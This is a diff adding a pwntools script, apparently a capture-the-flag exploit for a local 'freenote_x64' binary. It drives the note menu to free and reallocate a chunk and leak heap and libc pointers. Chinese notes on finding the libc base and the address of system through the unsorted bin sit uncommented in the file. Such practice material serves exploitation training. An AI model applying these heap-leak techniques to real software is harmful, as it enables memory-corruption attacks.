@@ -1,0 +1,63 @@
+#!/usr/bin/env python
+from pwn import *
+
+context(arch = 'x86_64', os = 'linux', endian='little')
+context.log_level = 'debug'
+#elf = ELF('./freenote_x64')
+p = process('./freenote_x64')
+#p = remote('127.0.0.1',10001)
+print proc.pidof(p)
+raw_input('gdb attach')
+  
+def new_note(x):
+    p.recvuntil("Your choice: ")
+    p.send("2\n")
+    p.recvuntil("Length of new note: ")
+    p.send(str(len(x))+"\n")
+    p.recvuntil("Enter your note: ")
+    p.send(x)
+
+def delete_note(x):
+    p.recvuntil("Your choice: ")
+    p.send("4\n")
+    p.recvuntil("Note number: ")
+    p.send(str(x)+"\n")
+
+def list_note():
+    p.recvuntil("Your choice: ")
+    p.send("1\n")
+    
+def edit_note(x,y):
+    p.recvuntil("Your choice: ")
+    p.send("3\n")   
+    p.recvuntil("Note number: ")
+    p.send(str(x)+"\n")   
+    p.recvuntil("Length of note: ")
+    p.send(str(len(y))+"\n")   
+    p.recvuntil("Enter your note: ")
+    p.send(y)
+    
+####################leak libc#########################
+
+if __name__ == '__main__':
+    notelen = 0x80
+    new_note('a' * notelen)
+    new_note('b' * notelen)
+    delete_note(0)
+    new_note('cccccccc')
+    list_note()
+    p.recvuntil('0. ')
+    leak = p.recvuntil('\n')
+    #log.info('heap:' + str(u64(leak[8:-1])))
+    print leak[0:-1].encode('hex')
+
+泄露libc基址的方法:
+运行脚本程序  python -m pdb myexp.py   (过程中会打印出进程号xxx)
+
+gdb attach  xxx
+vmmap 查看内存分布
+p main_arena
+p main_arena.bins[0]
+p &main_arena.bins[0]
+
+通过泄露unsort_bin 地址，我们来计算libc函数基址以及system 函数地址
